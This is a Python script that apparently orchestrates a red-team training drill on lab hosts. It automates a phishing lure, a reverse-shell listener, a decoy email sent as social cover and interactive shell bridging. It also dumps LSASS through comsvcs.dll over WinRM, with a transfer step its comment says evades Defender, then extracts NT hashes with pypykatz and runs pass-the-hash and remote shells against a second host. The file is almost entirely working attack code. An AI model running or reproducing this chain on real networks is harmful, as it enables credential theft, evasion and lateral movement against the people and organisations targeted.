#!/usr/bin/env python3
"""
OT Cyber Drill — GP-0 → GP-3 orchestrator.
PRIMARY COPY: /home/kali/drill/drill_run.py  (runs on Kali 10.5.20.50)
Second copy : Lab-Modules/OT-Cyber-Drill/cyberdrill-artefact/scripts/drill_run_kali.py

Usage:  python3 /home/kali/drill/drill_run.py

ONE CLICK. The reverse shell socket stays open from Stage 0 through Stage 1A
(interactive) so the student never has to click the email again.

Stage 0   Phish → shell lands → thank-you auto-sent → recon printed
Stage 1   A: live PS terminal on RAC (uses the SAME open socket, no re-click)
          B: silent WinRM dump + pypykatz NT hash extraction
Stage 2   Pass-the-hash confirm against NMS (nxc, from Stage 1B hash)
Stage 3   Shell on NMS (evil-winrm / impacket-wmiexec) or quit
"""
import sys, subprocess, threading, socket, select, time, base64
from pathlib import Path

from pypsrp.client import Client as WinRMClient

# ── constants ──────────────────────────────────────────────────────────────────
KALI_IP  = "10.5.20.50"
RAC      = "10.5.20.10"
RAC_USER = "NP\\Administrator"
RAC_PASS = ""  # redacted for VCS — set to the RAC domain-admin password before running
NMS      = "192.168.30.11"

DRILL = Path("/home/kali/drill")
WEB   = DRILL / "web"
LOOT  = DRILL / "loot"

# ── helpers ────────────────────────────────────────────────────────────────────
def banner(title):
    w = 62
    print(f"\n{'═'*w}\n  {title}\n{'═'*w}")

def ok(msg):   print(f"  [✓] {msg}", flush=True)
def info(msg): print(f"  [·] {msg}", flush=True)
def warn(msg): print(f"  [!] {msg}", flush=True)

def sh(cmd, timeout=20):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return r.stdout, r.stderr, r.returncode

def recv_prompt(s, timeout=8):
    """Read from shell socket until PS prompt or timeout."""
    s.settimeout(timeout); buf = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk: break
            buf += chunk
            if buf.rstrip().endswith(b">"): break
    except (socket.timeout, OSError):
        pass
    return buf.decode(errors="replace")

def shell_run(conn, cmd, wait=8):
    """Send one command to the open shell, return output."""
    try:
        conn.send((cmd + "\n").encode())
    except OSError:
        return ""
    return recv_prompt(conn, wait)


# ── Stage 0 ────────────────────────────────────────────────────────────────────
def stage0():
    """
    Deploy artefacts, start HTTP :8080, send real lure, wait for shell.
    Returns the open socket connection — kept alive for Stage 1.
    Thank-you decoy is sent automatically the moment the shell connects.
    """
    banner("STAGE 0 — Phishing foothold")

    WEB.mkdir(parents=True, exist_ok=True)
    LOOT.mkdir(parents=True, exist_ok=True)

    # HTTP server
    sh("pkill -f 'python3 -m http.server 8080' 2>/dev/null; sleep 0.3")
    sh(f"nohup python3 -m http.server 8080 --directory {WEB} "
       f"> {LOOT}/http.log 2>&1 &")
    time.sleep(0.5)
    out, _, _ = sh("ss -tlnp 2>/dev/null | grep 8080")
    ok("HTTP server :8080 started") if "8080" in out else warn("HTTP server may not have started")

    # Send real lure
    info("Sending lure email ...")
    out, err, rc = sh(f"python3 {DRILL}/phish_email.py --real", timeout=20)
    if rc == 0:
        ok("Lure sent → RemoteIT@mail.np.local  (shows as NP IT Administrator)")
    else:
        warn(f"Email error: {err.strip()[:120]}")

    # ── start listener BEFORE showing click instructions ──────────────────────
    # revshell.ps1 is one-shot (no retry) — listener must already be up when
    # the student clicks or the connection is refused and lost.
    info("Listening on :4444 for reverse shell (up to 5 min) ...")
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", 4444))
    srv.listen(1)
    srv.settimeout(300)

    print()
    print("  ┌──────────────────────────────────────────────────────────┐")
    print("  │  Listener is READY.  Now:                                │")
    print("  │  • Log into RAC (10.5.20.10) as NP\\Administrator        │")
    print("  │  • Open Thunderbird, find the 'Action required' email    │")
    print("  │  • Click  Run Mailbox Security Update                    │")
    print("  │  Shell will be caught automatically — no ENTER needed.   │")
    print("  └──────────────────────────────────────────────────────────┘")
    print()

    # ── wait for shell ─────────────────────────────────────────────────────────
    try:
        conn, addr = srv.accept()
    except socket.timeout:
        warn("No shell received within 5 minutes."); sys.exit(1)
    finally:
        srv.close()

    ok(f"Shell from {addr[0]}:{addr[1]}")

    # ── thank-you fires immediately in background ──────────────────────────────
    threading.Thread(
        target=lambda: sh(f"python3 {DRILL}/thankyou_email.py", timeout=15),
        daemon=True
    ).start()
    ok("Thank-you decoy email auto-sent (social cover active)")

    # ── recon — read initial prompt, then run commands ─────────────────────────
    recv_prompt(conn, 4)   # discard initial PS prompt

    whoami = shell_run(conn, "whoami", 6).strip()
    groups = shell_run(conn, 'whoami /groups | findstr /i "Domain Admin"', 8)

    ok(f"Identity : {whoami}")
    if "Domain Admin" in groups:
        ok("Privilege: Domain Admins ✓")
    else:
        warn("Domain Admin not confirmed — check groups manually")

    # Save recon
    (LOOT / "shell_output.txt").write_text(
        f"shell_from:{addr[0]}:{addr[1]}\nwhoami:{whoami}\ngroups:\n{groups}")

    ok("STAGE 0 COMPLETE — shell session is OPEN and will stay open")
    return conn   # ← passed to Stage 1


# ── Stage 1A — interactive shell (uses existing connection, no re-click) ───────
def stage1_interactive(conn):
    banner("STAGE 1A — Interactive shell on RAC  (same session, no re-click)")
    print()
    print("  You have a live PowerShell prompt on RAC.")
    print("  The session from Stage 0 is still active — type normally.")
    print("  Type  exit  to close the shell and return to the menu.")
    print("  ─────────────────────────────────────────────────────────────\n")

    # Print the current prompt so the operator sees where they are
    conn.send(b"\n")
    time.sleep(0.3)
    init = recv_prompt(conn, 3)
    if init.strip():
        sys.stdout.buffer.write(init.encode()); sys.stdout.buffer.flush()

    # Bridge stdin ↔ socket
    while True:
        try:
            readable, _, _ = select.select([conn, sys.stdin], [], [], 0.2)
        except (KeyboardInterrupt, OSError):
            break
        if conn in readable:
            data = conn.recv(4096)
            if not data: break
            sys.stdout.buffer.write(data); sys.stdout.buffer.flush()
        if sys.stdin in readable:
            line = sys.stdin.readline()
            if not line: break
            conn.send(line.encode())
            if line.strip().lower() == "exit":
                time.sleep(0.5); break

    print("\n  ─────────────────────────────────────────────────────────────")
    ok("Interactive session closed")
    try: conn.close()
    except OSError: pass

    # After interactive, ask for hash to proceed
    print()
    nt = input("  Enter the NT hash you extracted (blank to skip NMS stages): ").strip()
    return nt if nt else None


# ── Stage 1B — silent dump + hash extract (shell stays open throughout) ────────
def stage1_silent(conn):
    banner("STAGE 1B — Silent LSASS dump + NT hash extraction")
    info("Note: shell session remains open throughout — no interaction needed")

    DMP_RAC  = r"C:\Windows\Temp\lb2.dmp"
    DMP_KALI = str(LOOT / "lb2.dmp")

    # Dump via WinRM (proven reliable; shell conn stays open separately)
    info("Triggering LSASS dump on RAC via WinRM ...")
    PS_DUMP = rf"""
$lp=(Get-Process lsass).Id; "PID:$lp"
Remove-Item '{DMP_RAC}' -Force -EA SilentlyContinue
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lp '{DMP_RAC}' full
Start-Sleep -Seconds 5
if(Test-Path '{DMP_RAC}'){{"size:"+((Get-Item '{DMP_RAC}').Length)}}else{{"MISSING"}}
"""
    with WinRMClient(RAC, username=RAC_USER, password=RAC_PASS,
                     auth="ntlm", ssl=False) as c:
        out, _, _ = c.execute_ps(PS_DUMP)
    print(f"       {out.strip()}", flush=True)

    if "MISSING" in out or "size:0" in out:
        warn("Dump empty or missing — aborting."); sys.exit(1)

    info("Reading dump into memory (bypasses Defender on transit) ...")
    PS_READ = rf"[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('{DMP_RAC}'))"
    with WinRMClient(RAC, username=RAC_USER, password=RAC_PASS,
                     auth="ntlm", ssl=False) as c:
        b64, _, _ = c.execute_ps(PS_READ)
    raw = base64.b64decode(b64.strip())
    ok(f"{len(raw):,} bytes in memory")

    Path(DMP_KALI).write_bytes(raw)
    ok(f"Dump saved: {DMP_KALI}")

    info("Running pypykatz ...")
    out, _, _ = sh(f"python3 -m pypykatz lsa minidump {DMP_KALI} 2>/dev/null", timeout=120)
    lines = out.splitlines()

    nt_hash = None
    print()
    print("  ┌─── svc_backup ─────────────────────────────────────────┐")
    in_block = False
    for line in lines:
        if "svc_backup" in line.lower():
            in_block = True
        if in_block:
            s = line.strip()
            if s: print(f"  │  {s}")
            if s.startswith("NT:") and len(s) > 5:
                nt_hash = s.split("NT:")[1].strip()
                break
    print("  └───────────────────────────────────────────────────────┘")

    if nt_hash:
        ok(f"NT hash: {nt_hash}")
        (LOOT / "svc_backup.hash").write_text(nt_hash)
        ok(f"Hash saved: {LOOT}/svc_backup.hash")
    else:
        warn("svc_backup NT hash not found.")

    ok("STAGE 1B COMPLETE — RAC shell is still open")
    return nt_hash


# ── Stage 2 — PtH confirm ──────────────────────────────────────────────────────
def stage2(nt_hash):
    banner("STAGE 2 — Pass-the-hash → NMS (192.168.30.11)")
    for proto in ("smb", "winrm"):
        info(f"nxc {proto} ...")
        out, _, _ = sh(f"nxc {proto} {NMS} -u svc_backup -H {nt_hash} -d np.local",
                       timeout=30)
        for line in out.strip().splitlines():
            tag = "[✓]" if "Pwn3d" in line else "[·]"
            print(f"  {tag} {line.strip()}")

    info("Remote execution check ...")
    out, _, _ = sh(f"nxc winrm {NMS} -u svc_backup -H {nt_hash} -d np.local -x whoami",
                   timeout=30)
    for line in out.strip().splitlines():
        if "np\\" in line.lower():
            ok(f"Execution confirmed: {line.strip()}")
    ok("STAGE 2 COMPLETE")


# ── Stage 3 — NMS shell or quit ────────────────────────────────────────────────
def stage3(nt_hash):
    banner("STAGE 3 — Shell on NMS or quit")
    print()
    print("  Options:")
    print("    S  Open interactive shell on NMS (evil-winrm / wmiexec)")
    print("    Q  Quit")
    while True:
        choice = input("\n  > ").strip().upper()
        if choice in ("S", "Q"): break
        print("  Enter S or Q.")

    if choice == "Q":
        ok("Exiting."); return

    # pick tool
    _, _, rc = sh("which evil-winrm", timeout=5)
    if rc == 0:
        tool = "evil-winrm"
        cmd  = f"evil-winrm -i {NMS} -u svc_backup -H {nt_hash}"
    else:
        tool = "impacket-wmiexec"
        cmd  = f"impacket-wmiexec NP/svc_backup@{NMS} -hashes :{nt_hash}"

    ok(f"Using {tool}")
    print()
    print("  ┌───────────────────────────────────────────────────────┐")
    print("  │  Live shell on NMS as np\\svc_backup.                  │")
    print("  │  Type  exit  to close.                                │")
    print("  └───────────────────────────────────────────────────────┘\n")

    subprocess.run(cmd, shell=True)

    print()
    ok("NMS shell closed")
    ok("STAGE 3 COMPLETE")


# ── main ───────────────────────────────────────────────────────────────────────
def main():
    print("\n╔" + "═"*60 + "╗")
    print("║  OT CYBER DRILL — GP-0 → GP-3 ORCHESTRATOR" + " "*16 + "║")
    print("║  Kali: 10.5.20.50  RAC: 10.5.20.10  NMS: 192.168.30.11  ║")
    print("╚" + "═"*60 + "╝\n")

    # Stage 0 — one click, shell stays open
    conn = stage0()

    # Stage 1
    print()
    print("  Stage 1 — credential extraction:")
    print("    A  Interactive shell  (live PS on RAC — same session, no re-click)")
    print("    B  Silent dump        (LSASS dump → NT hash, shell stays open)")
    while True:
        choice = input("\n  > ").strip().upper()
        if choice in ("A", "B"): break
        print("  Enter A or B.")

    nt_hash = None
    if choice == "A":
        nt_hash = stage1_interactive(conn)  # closes conn when done
        conn = None
    else:
        nt_hash = stage1_silent(conn)       # conn stays open

    # Stage 2
    if nt_hash:
        print()
        yn = input("  Proceed to NMS (Stage 2 PtH confirm)? [Y/n] ").strip().upper()
        if yn != "N":
            stage2(nt_hash)
            stage3(nt_hash)   # immediately offers shell or quit
    else:
        info("No hash available — skipping Stages 2 and 3.")

    # Clean up RAC shell if still open (Stage 1B path)
    if conn:
        try: conn.send(b"exit\n")
        except OSError: pass
        try: conn.close()
        except OSError: pass
        info("RAC shell session closed.")

    print("\n  All stages complete. Goodbye.\n")


if __name__ == "__main__":
    main()
